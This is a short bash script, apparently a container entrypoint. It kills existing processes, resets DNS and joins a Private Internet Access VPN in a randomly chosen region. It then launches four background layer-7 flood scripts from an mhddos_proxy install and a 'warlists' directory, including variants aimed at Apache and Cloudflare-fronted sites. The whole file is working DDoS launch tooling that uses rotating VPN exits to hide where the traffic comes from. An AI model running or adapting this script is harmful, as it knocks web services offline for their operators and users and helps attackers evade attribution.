#!/bin/bash

killall -9 python3

killall openvpn
sleep "$(shuf -i 5-10 -n 1)"

set -e

echo 'nameserver 1.1.1.1' >/etc/resolv.conf

cd /opt/pia/
PIA_DNS='false' PIA_PF='false' VPN_PROTOCOL='openvpn_udp_standard' DISABLE_IPV6='yes' \
PREFERRED_REGION="$(shuf -n 1 /config/regions | sed -e 's/\r//' | sed -e 's/\n//')" \
/opt/pia/run_setup.sh

shuf /config/resolv.conf >/etc/resolv.conf

cd /opt/mhddos_proxy
/opt/warlists/scripts/run_l7.sh &
/opt/warlists/scripts/run_l7_apache.sh &
/opt/warlists/scripts/run_l7_cf.sh &
/opt/warlists/scripts/run_l7_get-stress.sh &
